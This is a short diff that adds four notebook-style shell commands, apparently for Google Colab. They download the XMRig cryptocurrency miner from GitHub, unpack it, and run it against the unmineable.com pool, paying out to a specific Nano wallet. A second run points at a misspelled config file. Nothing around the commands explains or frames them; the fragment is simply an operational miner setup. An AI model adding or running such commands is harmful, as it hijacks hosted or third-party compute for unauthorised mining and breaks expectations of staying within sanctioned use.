@@ -1,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
+!tar -xf xmrig-6.16.4-linux-x64.tar.gz
+!./xmrig --coin=XMR -o rx.unmineable.com:3333 -u Nano:nano_174osy37zewiwjdty3qksboa6xoaf5ymzo1kksa5x18uq1xwyxybhma4nb8u.colab -p x -k -a rx/0
+!./xmrig -c config.jason
